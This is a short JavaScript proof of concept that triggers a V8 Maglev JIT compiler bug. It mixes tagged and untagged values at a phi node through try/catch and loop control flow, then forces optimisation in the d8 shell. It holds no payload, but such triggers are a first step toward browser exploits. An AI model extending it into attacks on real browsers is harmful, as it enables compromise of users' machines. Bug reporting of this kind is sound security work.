let use_v3;
let obj = {};

function f1() {
  
    // Create a phi node and trigger the maglev untagged optimization
    let v3 = 5;
    for (let i = 0; i < 5; i++) {
        v3--;
    }
    use_v3 = v3;    // Prevent v3 from being deleted

    let v15 = 1.2;

    // The try statement and the catch statement each have a path that leads to do{...}while()
    try {
        Reflect.apply();    // Used to throw an exception
    } catch(e) {
    }

    // The BasicBlock corresponding to do{...}while() has three incoming edges: 
    // the try statement, the catch statement, and the loop's back edge
    do {
        obj[v15] = 1;   // tagged use of v3
        v15 = v3;
        for (let i40 = 100; i40; --i40) {
        }
    } while (v3);
}

%PrepareFunctionForOptimization(f1);
f1();
f1();
%OptimizeMaglevOnNextCall(f1);
f1();
//./d8 --allow-natives-syntax ./poc.js